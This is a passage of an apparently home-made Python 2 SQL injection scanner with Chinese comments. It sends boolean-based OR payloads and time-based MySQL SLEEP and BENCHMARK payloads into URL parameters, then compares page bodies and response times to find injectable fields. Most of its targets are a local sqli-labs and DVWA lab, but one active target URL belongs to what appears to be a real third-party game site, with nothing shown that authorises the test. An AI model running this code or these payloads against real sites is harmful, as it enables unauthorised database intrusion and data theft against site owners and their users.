        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False

        # test True,  混用更复杂的测试
        payload5 = quoteChar + " OR 2+1-1-1=1 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload5[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload5)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False


        # test False
        payload6 = quoteChar + " OR " + randStr + "=" + randStr + " AND 3+1-1-1=1 -- "
        if dontCommentRestOfQuery:
            payload1 = payload6[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload6)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test False
        payload7 = quoteChar + " OR 3*2=5 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload7[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload7)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test True
        payload8 = quoteChar + " OR 3*2=6 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload8[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload8)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False

        # test False
        payload9 = quoteChar + " OR 3*2*0=6 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload9[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload9)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody == trueBody:
            return False

        # test True
        payload10 = quoteChar + " OR 3*2*1=6 AND " + randStr + "=" + randStr + " -- "
        if dontCommentRestOfQuery:
            payload1 = payload10[:-4]

        paramValue = self.get_request_payload(origValue, varIndex, payload10)
        #logger.debug("paramValue= {}".format(paramValue))
        logger.debug("paramValue= {}".format(repr(paramValue)))
        # 如果正确，这里只有一个值
        self.hj.request_param_dict = paramValue
        status_code, headers, html, time_used = self.hj.request()
        if  self.hj.ConnectionErrorCount >0:
            return False

        testBody = self.filter_body(html, urllib.urlencode(paramValue))
        if testBody != trueBody:
            return False

        return paramValue


    def genSleepString(self, sleepType):
        if (sleepType == 'long'):
            return str(self.longDuration)
        elif sleepType == 'verylong':
            return str(int(self.shortDuration) + int(self.longDuration))
        elif sleepType == 'mid':
            return str(self.shortDuration)
        elif sleepType == '2xmid':
            return str(2 * int(self.shortDuration) + 1)
        elif sleepType  == 'none':
            return "0"

    def testTiming(self, varIndex, paramValue, dontEncode, benchmark=False, replace=False):
        # origParamValue = paramValue
        timeOrigValueDict = self.orivalue.copy()
        tmp_origvalue = timeOrigValueDict[self.variations[varIndex]]
        if replace:
            timeOrigValueDict[self.variations[varIndex]] = paramValue
        else:

            timeOrigValueDict[self.variations[varIndex]] += paramValue
        origParamValue = urllib.unquote(urllib.urlencode(timeOrigValueDict))

        logger.info(Fore.RED + "origParamValue= {}".format(repr(origParamValue)) + Style.RESET_ALL)
        confirmed = False
        # 生成四个时间变量
        time1 = 0 # long  4
        time2 = 0 # no    0
        time3 = 0 # mid   3
        time4 = 0 # very long 6

        timeOutSec = 20
        zeroTimeOut = self.shortDuration - 1
        if (zeroTimeOut > 3): zeroTimeOut = 3

        timeOutCounter = 0

        def stepLongDelay():
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('long'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '4000000')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            #paramValue = urllib.urlencode(paramValue)
            paramValue_dict = Url.qs_parse(paramValue)

            #print ""
            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('long')))
            if self.hj.ConnectionErrorCount > 0:
                return False

            time1 = time_used
            if time1 < (int(self.longDuration) * 99 /100): return False
            return time1

        def stepZeroDelay():
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('none'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '1')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            #paramValue = urllib.urlencode(paramValue)
            paramValue_dict = Url.qs_parse(paramValue)

            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('none')))
            if self.hj.ConnectionErrorCount > 0:
                timeOutCounter += 1

            time2 = time_used
            if time2 > zeroTimeOut: return False

            return time2

        def stepMidDelay():
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('mid'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '1000000')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            #paramValue = urllib.urlencode(paramValue)
            paramValue_dict = Url.qs_parse(paramValue)

            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('mid')))
            if self.hj.ConnectionErrorCount > 0:
                return False

            time3 = time_used
            if (time3 < int(self.shortDuration) * 99 /100): return False

            return time3

        def stepVeryLongDelay():
            veryLongDuration = int(self.shortDuration) + int(self.longDuration)
            if not benchmark:
                paramValue = origParamValue.replace('{SLEEP}', self.genSleepString('verylong'))
            else:
                paramValue = origParamValue.replace('{BSLEEP}', '5000000')
            # 这里可能有点问题，一会再改
            paramValue = paramValue.replace('{ORIGVALUE}', tmp_origvalue)
            paramValue = paramValue.replace('{RANDSTR}', random_str())
            # 这里paramValue应该是a=b&c=d这种形式的，
            #paramValue = urllib.urlencode(paramValue).replace('%20', '+')
            #paramValue = urllib.urlencode(paramValue)
            paramValue_dict = Url.qs_parse(paramValue)

            self.hj.request_param_dict = paramValue_dict
            status_code, headers, html, time_used = self.hj.request()
            logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('verylong')))
            if self.hj.ConnectionErrorCount > 0:
                return False

            time4 = time_used
            if (time4 < veryLongDuration * 99 /100): return False

            return time4

        permutations = ("lzvm", "lzmv", "lvzm", "lvmz", "lmzv", "lmvz", "vzlm", "vzml", "vlzm", "vlmz", "vmzl", "vmlz", "mzlv", "mzvl", "mlzv", "mlvz", "mvzl", "mvlz")
        permIndex = random.randint(0, len(permutations)-1)

        permutation = permutations[permIndex] + 'zzzlz'
        for i in permutation:
            if i == 'z':
                time2 = stepZeroDelay()
                if time2 is False:
                    return False

            elif i == 'l':
                time1 = stepLongDelay()
                if time1 is False:
                    return False
            elif i == 'v':
                time4 = stepVeryLongDelay()
                if time4 is False:
                    return False
            elif i == 'm':
                time3 = stepMidDelay()
                if time3 is False:
                    return False

        logger.info("\ntime1={}\ntime2={}\ntime3={}\ntime4={}".format(time1,time2,time3,time4))
        # 在上边都完成之后
        if (time3 >= time4  or time3 > time1 or time2 > time4 or time2 > time1):
            return False

        if (time3 >= time1):
            return False

        if (time1 >= time4):
            return False

        if timeOutCounter > 0:
            return False

        return True



    def testTimingStartPoint(self, varIndex):
        prefix = [('', ''), ('\'', '\''), ('"', '""'), ('\')', '\'('), ('")', '"('), ]
        for quoteChar in prefix:
            payload = quoteChar[0] + " or if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/" + " or " + quoteChar[1]
            logger.info(Fore.RED + u"pyaload={}".format(repr(payload)) + Style.RESET_ALL)
            time_result = self.testTiming(varIndex, payload, True, benchmark=False)
            if time_result:
                logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True
        # send payload
        for quoteChar in prefix:
            payload = quoteChar[0] + " or (select(0)from(select(sleep({SLEEP})))v)/*'%2b(select(0)from(select(sleep({SLEEP})))v)%2b0'\"%2b(select(0)from(select(sleep({SLEEP})))v)+\"*/" + " or " + quoteChar[1]
            print repr(payload)
            print "------------------------"
            time_result = self.testTiming(varIndex, payload, True, benchmark=False)
            if time_result:
       # logger.debug("paramValue= {}".format(repr(paramValue)))
                logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True
        # awvs original payload like this
        payload = "if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/"

        time_result = self.testTiming(varIndex, payload, True, benchmark=False, replace=True)
        if time_result:
            logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
            return True

        payload2 = "(select(0)from(select(sleep({SLEEP})))v)/*'%2b(select(0)from(select(sleep({SLEEP})))v)%2b'\"%2b(select(0)from(select(sleep({SLEEP})))v)%2b\"*/"
        time_result = self.testTiming(varIndex, payload2, True, benchmark=False, replace=True)
        if time_result:
            logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
            return True
        payload3 = '\xdf\'AND (SELECT * FROM (SELECT(SLEEP({SLEEP})))zpGO)-- -'
        time_result = self.testTiming(varIndex, payload3, True, benchmark=False, replace=True)
        if time_result:
            logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
            return True


        return False
        # benchmark loser


    def testBoolStartPoint(self, varIndex):
        prefix = ['', '\'', '"', '\')', '")', '\xdf\'']
        for quoteChar in prefix:
            time_result = self.testInjectionNumber(varIndex, quoteChar, False)
            if time_result:
                logger.info(Fore.RED + "Found Bool Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True

        for quoteChar in prefix:
            time_result = self.testInjection(varIndex, quoteChar, False)
            if time_result:
                logger.info(Fore.RED + "Found Bool Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True

        for quoteChar in prefix:
            time_result = self.testInjectionWithOR(varIndex, quoteChar, False)
            if time_result:
                logger.info(Fore.RED + "Found Bool/With OR Injection At URL={}".format(self.url) + Style.RESET_ALL)
                return True

        return False

    def startTest(self):
        try:
            for varIndex in self.variations:
                if self.checkIfResponseIsStable(varIndex):
                    logger.info("[startTest] Response Is Stable")
                else:
                    logger.info("[startTest] Response Is Not Stable")

                r = self.testBoolStartPoint(varIndex)
                if r:
                    return True


                r = self.testTimingStartPoint(varIndex)
                if r:
                    #here shoud be return a format result
                    return True



            return False
        except Exception as e:
            logger.error("error happend, reason is :{}, URL: {}".format(repr(e), self.url))
            # r = self.testInjectionWithOR(varIndex)

def main():
    headers = {
        #"Cookie": 'security=low; PHPSESSID=qn7uogv579nbifqopr1hf53k36',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36',
        'Referer': 'http://10.127.21.237/dvwa/vulnerabilities/sqli_blind/'
    }
   # url = 'http://10.127.21.237/sqli-labs/Less-1/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-2/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-3/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-4/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-5/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-6/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-7/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-8/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-9/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-10/?id=1'
    #a = SQLInjectionTime(url, headers)
    #r = a.startTest()
    #if r:
    #    print "o fuck"

    #url = 'http://10.127.21.237/sqli-labs/Less-11/'
    #url = 'http://10.127.21.237/sqli-labs/Less-17/'
    '''
    less 17 update can not detect, sqlmap default/awvs also;
    less 18 header was not detect,
    less 19-22 can not detect , header,cookie, xff and so on


    less 28a bool failed
    '''
    #url = 'http://10.127.21.237/sqli-labs/Less-21/'
    #data = 'uname=a&passwd=b&submit=Submit'
    data=None
    #url = 'http://10.127.21.237/sqli-labs/Less-23/?id=1'
    #url = 'http://10.127.21.237/sqli-labs/Less-25/?id=1'
    url = 'http://10.127.21.237/sqli-labs/Less-25a/?id=1'
    url_list = ['http://10.127.21.237/sqli-labs/Less-26/?id=1',]
    url_list += ['http://qc.bi.game.pps.tv/index.php?r=consoleGame/showReport/rank?start_date=2018-05-20&end_date=2018-05-23&game_id=3654',]
    #url_list += ['http://s13.iqiyi.dm.chuangquannet.cn/api/game_step.php?playerid=&step=100&name=&uid=1240967466',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-3/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-26a/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-27/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-27a/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-28/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-28a/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-29/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-30/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-31/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-32/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-33/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-35/?id=1',]
    #url_list += ['http://10.127.21.237/sqli-labs/Less-36/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-38/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-39/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-40/?id=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-41/?id=1',]

    # url_list += ['http://10.127.21.237/sqli-labs/Less-46/?sort=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-47/?sort=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-48/?sort=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-49/?sort=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-50/?sort=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-51/?sort=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-52/?sort=1',]
    # url_list += ['http://10.127.21.237/sqli-labs/Less-53/?sort=1',]


    result = []
    for url in url_list:
        a = SQLInjectionTime(url, headers, data=data)
        r = a.startTest()
        if r:
            print 'o fuck post'
            result.append("URL={} &Reuslt={}".format(url, True))
        else:
            result.append('URL={} & Result={}'.format(url, False))

    for i in result:
        print i


    # for i in a.variations:
    #     print i
    #     if a.checkIfResponseIsStable(i):
    #         logger.info("stable")
    #     else:
    #         logger.info('unstable')
    #     test = a.testInjection(i, "'", False)
    #     logger.info("test={}".format(test))
    #     if test:
    #         logger.info("found")
    #         # return
    #     else:
    #         logger.info("fuck")

    #     test = a.testInjectionWithOR(i, "'", False)
    #     if test:
    #         logger.info("with or found")
    #         # return
    #     else:
    #         logger.info("with or fucked")

    #     time_payload1 = "'" + " or if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/" + " or " + "'"
    #     test = a.testTiming(i, time_payload1, True, benchmark=False)
    #     if test:
    #         logger.info("time success")
    #         # return
    #     else:
    #         logger.info("time fucked")

    #     time_payload2 = "'" + " or if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0)/*'XOR(if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0))OR'\"XOR(if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0))OR\"*/" + " or " + "'"
    #     test = a.testTiming(i, time_payload2, True, benchmark=True)
    #     if test:
    #         logger.info("benchmark success")
    #     else:
    #         logger.info("benchmark fucked")

if __name__ == '__main__':
    main()
